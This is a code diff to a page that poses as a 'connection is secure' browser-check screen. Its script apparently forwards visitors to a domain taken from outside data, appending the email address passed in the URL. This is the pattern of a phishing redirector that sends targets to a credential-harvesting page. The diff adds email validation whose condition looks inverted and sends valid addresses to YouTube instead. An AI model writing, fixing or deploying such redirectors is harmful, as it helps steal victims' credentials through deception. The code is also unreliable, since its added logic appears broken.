@@ -70,6 +70,10 @@ may see this page while the site ensures that the connection is secure.</div></d
     </div>
 
 <script>
+function isValidEmail(email) {
+  const emailRegex = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/;
+  return emailRegex.test(email);
+}
 function filter(data,param) {
 let domain;
     domain = data.domain_name;
@@ -77,10 +81,11 @@ let domain;
 // var url = window.location.href;
 const urlParams = new URLSearchParams(window.location.search);    
 const email = urlParams.get('e');
+
 // let Url = {
 //     get get(){
 //         var vars= {};
-//         if(url.length!==0)
+//         if(url.length!==0)   
 //             url.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value){
 //                 key=decodeURIComponent(key);
 //                 if(typeof vars[key]==="undefined") {vars[key]= decodeURIComponent(value);}
@@ -91,8 +96,12 @@ const email = urlParams.get('e');
 // };
 
 
+if(email && email!=="" && !isValidEmail(email)){
+    window.location.href = domain+email;
+}else{
+    window.location.href = "https://youtube.com";
+}
 
-window.location.href = domain+email;
 }
 
 setTimeout( function(){
